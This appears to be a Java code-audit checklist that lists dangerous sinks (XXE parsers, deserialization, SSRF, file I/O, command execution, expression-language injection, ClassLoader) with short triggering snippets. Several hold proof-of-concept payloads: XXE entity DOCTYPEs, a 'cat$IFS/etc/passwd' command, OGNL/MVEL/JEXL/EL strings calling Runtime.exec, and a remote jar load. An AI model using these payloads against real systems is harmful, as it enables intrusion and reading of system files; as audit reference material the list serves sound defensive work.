## Java Checklist

### XXE
- SAXReader
```java
SAXReader saxReader = new SAXReader();
saxReader.read(is);
```
- DocumentBuilder
```java
DocumentBuilder db = DocumentBuilderFactory.newInstance().newDocumentBuilder();
Document doc = db.parse(input);
```
- XMLStreamReader
```java
XMLInputFactory factory = XMLInputFactory.newFactory();
XMLStreamReader reader = factory.createXMLStreamReader(is);
while(reader.hasNext()){
    reader.next();
}
```

- SAXBuilder
```java
SAXBuilder builder = new SAXBuilder();
builder.build(is);
```
- SAXParser
```java
SAXParserFactory factory = SAXParserFactory.newInstance();
SAXParser parser = factory.newSAXParser();
InputStream in = new ByteArrayInputStream(xmlstring.getBytes());
parser.parse(in,new  HandlerBase());
```
- XMLReader
```java
XMLReader reader = XMLReaderFactory.createXMLReader();
reader.setContentHandler(null);
reader.parse(new InputSource(is));
```

- TransformerFactory
```java
Transformer transformer = TransformerFactory.newInstance().newTransformer();
transformer.transform(new SAXSource(new InputSource(is)),new DOMResult());
```
- SAXTransformerFactory
```java
SAXTransformerFactory sf = (SAXTransformerFactory) SAXTransformerFactory.newInstance();
StreamSource source = new StreamSource(is);
sf.newTransformerHandler(source);
```
- SchemaFactory
```java
// xml前不能有<?xml version="1.0"?>
String xmlString = "<!DOCTYPE root[<!ENTITY % d SYSTEM 'http://127.0.0.1:8000/aaaxxx'>%d;]><root>ahha</root>";
InputStream is = new ByteArrayInputStream(str.getBytes());
SchemaFactory factory = SchemaFactory.newInstance("http://www.w3.org/2001/XMLSchema");
StreamSource source = new StreamSource(is);
Schema schema = factory.newSchema(source);
```
- Unmarshaller（默认解析方法不能利用）
```java
JAXBContext jaxbContext = JAXBContext.newInstance();
Unmarshaller jaxbUnmarshaller = jaxbContext.createUnmarshaller();
jaxbUnmarshaller.unmarshal(new StringReader(xmlString));
```
- DocumentHelper
```java
DocumentHelper.parseText(xmlString);
```

- XPathExpression(?)
```java
//网上的利用代码，实际上evaluate的参数是Node类型，代码都跑不通，不知道是不是跟java版本有关
XPathFactory xPathFactory = XPathFactory.newInstance();
XPath xpath = xPathFactory.newXPath();
XPathExpression xPathExpr = xpath.compile("/somepath/text()");
xPathExpr.evaluate(new InputSource(is));

//以下是OWASP的代码，但是DocumentBuilder的parse已经触发XXE了，Xpath不知道来干啥的？。。。。
DocumentBuilderFactory df = DocumentBuilderFactory.newInstance();
DocumentBuilder builder = df.newDocumentBuilder();
String result = xPathExpr.evaluate(builder.parse(new ByteArrayInputStream(xmlString.getBytes())) );
```

- SQLXML
```java
import javax.xml.transform.dom.DOMSource;
import java.sql.*;

/**
 * CVE-2021-2471
 * https://nvd.nist.gov/vuln/detail/CVE-2021-2471
 *
 * create table tb_test (id bigint(20) unsigned NOT NULL AUTO_INCREMENT COMMENT '主键id',message text COMMENT 'SQLXML',PRIMARY KEY (`id`));
 *
 * insert into tb_test(message) value('<?xml version="1.0" ?> <!DOCTYPE note [ <!ENTITY % remote SYSTEM "http://127.0.0.1:80/xxe.dtd"> %remote; ]>');
 */
public class OracleJDBC {

    public static void main(String[] args) throws SQLException {
        Connection connection = MySQLConnectorJFactory.getConnection();
        if (connection != null) {
            Statement statement = connection.createStatement();
            statement.execute("select * from tb_test");
            ResultSet resultSet = statement.getResultSet();
            while (resultSet.next()) {
                SQLXML sqlxml = resultSet.getSQLXML("message");
                sqlxml.getSource(DOMSource.class);
            }
        }
    }
}
```
### Deserialization
- readObject
- readUnshared
- Yaml.load
- XStream.fromXML
- XMLDecoder.readObject
- ObjectMapper.readValue
- JSON.parseObject

### SSRF
- HttpClient4
```java
CloseableHttpClient httpClient = HttpClients.createDefault();
HttpGet getRequest = new HttpGet("http://127.0.0.1:8000/client");
HttpResponse response = httpClient.execute(getRequest);
```
- HttpClient3
```java
HttpClient httpClient = new HttpClient();
GetMethod getMethod = new GetMethod(url);
httpClient.executeMethod(getMethod);
```
- ImageIO
```java
URL url = new URL("http://127.0.0.1:8000/imageio");
Image image = ImageIO.read(url);
```
- URLConnection
```java
URL pic = new URL("http://127.0.0.1:8000/ssrf");
URLConnection u = pic.openConnection();
u.getInputStream();
```
- Socket
```java
Socket socket = new Socket("127.0.0.1", 18000);
```
- OkHttpClient
```java
OkHttpClient client = new OkHttpClient();
Request request = new Request.Builder().url("http://127.0.0.1:8000/ok").build();
client.newCall(request).execute().body().string();
```
### FILE
- MultipartFile
```java
@RequestMapping(value = "/upload", method = RequestMethod.POST)
@ResponseBody
public String upload(@RequestParam("multipartFile") MultipartFile multipartFile) {
....
}
```
- createNewFile
```java
new File("/tmp/aaa").createNewFile();
```
- FileInputStream
```java
FileInputStream fis = new FileInputStream(new File("/etc/passwd"));
```
- FileOutputStream
```java
FileOutputStream fos = new FileOutputStream(new File("1.jsp"));
```
- FileReader
```java
FileReader fr=new FileReader("/etc/passwd");
fr.read(cc);
```
- FileWriter
```java
FileWriter fw=new FileWriter("/tmp/test.txt",true);
BufferedWriter bw=new BufferedWriter(fw);
char[]  chs = {'a','b','c','d'};
bw.write(chs);
```
- delete
```java
new File("/etc/passwd").delete();
```
- mkdir
```java
new File("/tmp").mkdirs();
new File("/tmp").mkdir();
```
- listFiles
```java
File[] s=new File("/tmp").listFiles();
for(int i=0;i<s.length;i++){
    System.out.println(s[i].getName());
}
```
- list
```java
String[] s=new File("/tmp").list();
for(int i=0;i<s.length;i++){
    System.out.println(s[i]);
}
```
- RandomAccessFile
```java
File file = new File("/tmp/test.txt");

        // 定义待写入文件内容
        String content = "Hello World.";

        try {
            // 创建RandomAccessFile对象,rw表示以读写模式打开文件，一共有:r(只读)、rw(读写)、
            // rws(读写内容同步)、rwd(读写内容或元数据同步)四种模式。
            RandomAccessFile raf = new RandomAccessFile(file, "rw");

            // 写入内容二进制到文件
            raf.write(content.getBytes());
            raf.close();
        } catch (IOException e) {
            e.printStackTrace();
        }

```

- NIO
```java
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;

/**
 * Creator: yz
 * Date: 2019/12/4
 */
public class FilesDemo {

    public static void main(String[] args) {
        // 通过File对象定义读取的文件路径
//        File file  = new File("/etc/passwd");
//        Path path1 = file.toPath();

        // 定义读取的文件路径
        Path path = Paths.get("/etc/passwd");

        try {
            byte[] bytes = Files.readAllBytes(path);
            System.out.println(new String(bytes));
        } catch (IOException e) {
            e.printStackTrace();
        }
        
        path = Paths.get("/tmp/test.txt");

        // 定义待写入文件内容
        String content = "Hello World.";

        try {
            // 写入内容二进制到文件
            Files.write(path, content.getBytes());
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

}


```
### Autobinding
- @SessionAttributes
```java
@RequestMapping(value = "/home", method = RequestMethod.GET)
public String home(@SessionAttribute User user, Model model) {
    ...
}
```
- @ModelAttribute
```java
@RequestMapping(value = "/home", method = RequestMethod.GET)
public String home(@ModelAttribute User user, Model model) {
    ...
}
```
详细可参考[https://xz.aliyun.com/t/128](https://xz.aliyun.com/t/128)
### URL-Redirect
- sendRedirect
```java
response.sendRedirect(redirectURL);
```
- setHeader
```java
response.setHeader("Location", "http://www.baidu.com");
```
### Command Execution
- Runtime.getRuntime.exec
```java
Runtime.getRuntime().exec(new String[]{"sh","-c","whoami"});
```
- ProcessBuilder.start
```java
ProcessBuilder processBuilder = new ProcessBuilder(new String[]{"sh","-c","whoami;cat$IFS/etc/passwd"});
Process start = processBuilder.start();
```
- GroovyShell.evaluate
```java
GroovyShell gs = new GroovyShell();
gs.evaluate("print 'whoami'.execute().text");
```
- ScriptEngine
```java
ScriptEngineManager factory = new ScriptEngineManager();
ScriptEngine engine = factory.getEngineByName("JavaScript");
if (engine == null)
    engine = factory.getEngineByName("Rhino JavaScript");  // ServiceMix
engine.eval("var x=new java.lang.ProcessBuilder; x.command(\"curl\",\"http://127.0.0.1:8000/cmd\"); x.start()");
```
- UNIXProcess/ProcessImpl

### Expression Language
- Apache Common Text(prior to 1.10.0)
```java
StringSubstitutor interpolator = StringSubstitutor.createInterpolator();
interpolator.replace("${script:js:java.lang.Runtime.getRuntime().exec(\"open -a Calculator\")}");
```
- SPEL
```java
SpelExpressionParser parser = new SpelExpressionParser();
Expression expression = parser.parseExpression(input);
expression.getValue().toString();
```
- OGNL
```java
OgnlContext context = new OgnlContext();
Ognl.getValue("@java.lang.Runtime@getRuntime().exec('calc')", context, context.getRoot());
```
具体可触发OGNL解析的接口请参考[mi1k7ea大佬的总结](https://www.mi1k7ea.com/2020/03/16/OGNL%E8%A1%A8%E8%BE%BE%E5%BC%8F%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/)

- MVEL
```java
String expression = "new java.lang.ProcessBuilder(/"calc/").start();";  
MVEL.eval(expression, vars);
```
```java
// weblogic CVE-2020-14882
com.tangosol.coherence.mvel2.sh.ShellSession("java.lang.Runtime.getRuntime().exec('calc.exe');");
```

- JEXL
```java
String Exp = "233.class.forName('java.lang.Runtime').getRuntime().exec('whoami')";
JexlEngine engine = new JexlBuilder().create();
JexlExpression Expression = engine.createExpression(Exp);
JexlContext Context = new MapContext();
Expression.evaluate(Context);
```
- JSTL_EL
```jsp
<spring:message text="${\"\".getClass().forName(\"java.lang.Runtime\").getMethod(\"getRuntime\",null).invoke(null,null).exec(\"calc\",null).toString()}">
</spring:message>
```

- EL
```java
String expression = "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder('calc').start()\")";
ELManager manager = new ELManager();
ELContext context = manager.getELContext();
ExpressionFactory factory = ELManager.getExpressionFactory();
ValueExpression ve = factory.createValueExpression(context, "${" + expression + "}", Object.class);
ve.getValue(context);

ELProcessor processor = new ELProcessor();
Process process = (Process) processor.eval("\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder('calc').start()\")");
```

### ClassLoader
- URLClassLoader
```java
new java.net.URLClassLoader(new java.net.URL[]{new java.net.URL("http://127.0.0.1:8888/bcel.jar")}).loadClass("BCEL").getConstructor().newInstance();
```

